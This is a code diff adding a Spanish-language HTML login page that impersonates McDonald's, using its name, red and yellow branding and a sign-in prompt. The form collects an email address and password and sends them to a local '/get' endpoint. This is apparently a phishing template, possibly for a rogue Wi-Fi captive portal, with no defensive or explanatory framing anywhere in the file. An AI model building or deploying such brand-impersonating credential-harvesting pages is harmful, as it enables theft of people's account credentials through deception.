@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>McDonald's - Iniciar sesión</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f4f4f4; /* Fondo gris claro */
+        }
+        .login-container {
+            background-color: #fff; /* Fondo blanco para el recuadro */
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 100%;
+            text-align: center; /* Centramos el contenido */
+        }
+        h1 {
+            margin-bottom: 20px;
+            color: #da291c; /* Rojo característico de McDonald's */
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #da291c; /* Rojo característico de McDonald's */
+            font-size: 14px; /* Texto más pequeño para "Con tu cuenta de McDonald's" */
+        }
+        .g-input {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .gbtn-primary {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            background-color: #ffc72c; /* Amarillo característico de McDonald's */
+            color: #000; /* Texto en negro */
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .gbtn-primary:hover {
+            background-color: #eab308; /* Amarillo más oscuro en hover */
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #da291c; /* Rojo de McDonald's */
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>McDonald's</h1>
+        <h2>Conectate con tu correo electronico.</h2>
+        <form action="/get" id="email-form-step">
+            <input name="email" type="email" class="g-input" placeholder="Correo electrónico" required>
+            <input name="password" type="password" class="g-input" placeholder="Contraseña" required>
+            <button class="gbtn-primary" type="submit">Siguiente</button>
+        </form>
+        <div class="footer">
+            <p>¿No tienes cuenta? <a href="#">Crea una cuenta</a></p>
+        </div>
+    </div>
+</body>
+</html>
